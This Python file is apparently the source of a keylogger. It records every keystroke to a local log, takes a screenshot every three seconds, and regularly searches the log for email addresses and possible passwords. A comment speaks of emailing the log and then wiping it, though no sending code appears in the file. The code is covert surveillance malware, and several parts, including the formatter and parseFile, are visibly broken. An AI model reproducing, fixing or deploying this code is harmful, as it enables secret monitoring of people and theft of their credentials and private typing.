import os
import re
import time
from mss import mss
from pynput.keyboard import Listener
from threading import Timer, Thread

'''
This class sets a time to execute a process on interval
'''
class FrequencyTimer(Timer):
    #this method controls the delays, @self : this instance of FrequencyTimer
    def start(self):
        while not self.finished.wait(self.interval):
            #create timer for program to use on interval
            self.function(*self.args, **self.kwargs)

class Keylogger:

    '''
    this method takes a keylogger instance and a key and
    writes the key to a file
    @self : this instance of Keylogger
    @key : the key that was pressed
    '''
    def _keyStrike(self, key):
        #open file
        global keylist
        print("heardsomthing")
        keylist.append(key)
        listSize = 50
        line = ""
        if len(keylist) > listSize:
            with open('./log/keylog/log.txt', 'a') as file:
                line = self.formatter(keylist)
                file.write(line)
                keylist = []
    '''
    This methods formats the keys by stripping the quotes
    and also replaces the name of the key with its value
    in order to have more human readable string
    @self : this instace of Keylogger
    @keylist : the list of keys

    ****BUG : using arrow keys will crash the program*****
    
    '''
    def formatter(self, keylist):
        string = ""
        #iterate through keys and format
        for k in keylist:
            key = str(k).replace("'","") #remove ' ' from keys
            #substitue key names for key values (Key.space = ' ')
            if key == 'Key.space':
                string = string + key.replace('Key.space', ' ')
            elif key == 'Key.enter':
                string = string + '\n'
            elif key == 'Key.backspace':
                string == string + " [BS] "
            elif key == 'Key.shift':
                string == string + " [Sh] "
            else:
                string = string + key
        return string + '\n'
                
            
    '''
    this meathod sets up the folders for saving
    the text file and screenshots images
    @self : this instance of Keylogger
    '''
    def _setupDir(self):
        if not os.path.exists('./log'):
            os.mkdir('./log') #create parent log directory
            os.mkdir('./log/keylog') #create directory for keylog text file
            os.mkdir('./log/screenshots/') #create directory for storing screenshots
    '''
    this method uses mms libary to take screenshots
    @self : this instance of Keylogger
    '''
    def _screenCapture(self):
        capture = mss() #create instance of mss
        capture.shot(output='./log/screenshots/{}.png'.format(time.time()))

    '''
    this method "listens" for keyboard events
    '''
    def _keyScript(self):
        with Listener(on_press=self._keyStrike) as listener:
            listener.join()
    
    '''
    this method is the main method to run a keylogger instance
    @self : this instance of Keylogger
    @frequency : interval for screenshots , default is 1
    '''
    def exe(self, frequency = 3):
        self._setupDir()
        Thread(target=self._keyScript).start()
        FrequencyTimer(frequency, self._screenCapture).start()
        FrequencyTimer(30, self.parseFile).start()

    '''
    this method parses our log file for emails and possible passwords
    and writes them to another file for easier reading
    @self : this instance of Keylogger
    '''    
    def parseFile(self):
        regex = re.compile(r'[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}')
        with open('./log/keylog/log.txt', 'r') as file, open ('./log/keylog/parsed.txt', 'a+') as parsed:
            for line in file:
                result = regex.search(line)
                parsed.write(result)
                parsed.close()

    '''
    this method will wipe our log file after we send it to our email
    (call from email function)
    '''
    def wipeFile(self):
        os.remove('./log/keylog/log.txt')
                
#main: create Keylogger instance and run it
if __name__== "__main__":
    keylist = [] #global list to format the output
    logger = Keylogger() # declare and intialze Keylogger object
    logger.exe()    # run keylogger

